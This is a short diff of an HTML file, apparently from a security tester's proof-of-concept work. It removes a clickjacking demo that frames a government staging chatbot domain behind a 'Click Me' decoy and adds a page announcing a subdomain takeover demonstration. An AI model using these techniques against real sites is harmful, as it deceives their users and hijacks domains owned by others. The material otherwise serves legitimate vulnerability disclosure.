@@ -1,27 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <style>
-    iframe {
-        position:relative;
-        width: 1920px;
-        height: 1080px;
-        opacity: 1000;
-        z-index: 2;
-    }
-    div {
-        position:absolute;
-        top:300px;
-        left:60px;
-        z-index: 1;
-    }
-</style>
-<div>Click Me</div>
-<input type="button" value="clica aqui man" style="z-index:-1;left: 1200px;position: relative;top: 800px;"/>    
-<iframe src="http://stage-chatbot.defensoria.ce.def.br"></iframe>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Subdomain Takeover Felipe Duarte</title>
 </head>
 <body>
+<h1>Subdomain Takeover Felipe Duarte</h1>
+<p>Esta é uma demonstração de um subdomínio takeover com o nome Felipe Duarte.</p>
 </body>
-
-
-
-
-
+</html>
